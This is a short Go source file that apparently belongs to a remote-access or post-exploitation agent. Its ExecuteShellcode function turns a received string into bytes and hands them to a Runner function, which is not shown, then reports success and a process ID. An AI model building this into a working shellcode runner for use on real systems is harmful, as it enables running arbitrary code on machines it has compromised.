package shellcode

import (
	"../util"
	"strconv"
)

const (
	SUCCESS_PID			   = 0
	ERROR_PID			   = 1
)

// ExecuteShellcode will transform and execute shellcode
func ExecuteShellcode(command string) ([]byte, error, string) {
	bytes, _ := util.StringToByteArrayString(command)
	execute, pid := Runner(bytes)
	if execute {
		return []byte("Shellcode executed successfully."), nil, strconv.Itoa(pid)
	}
	return []byte("Shellcode execution failed."), nil, strconv.Itoa(pid)
}
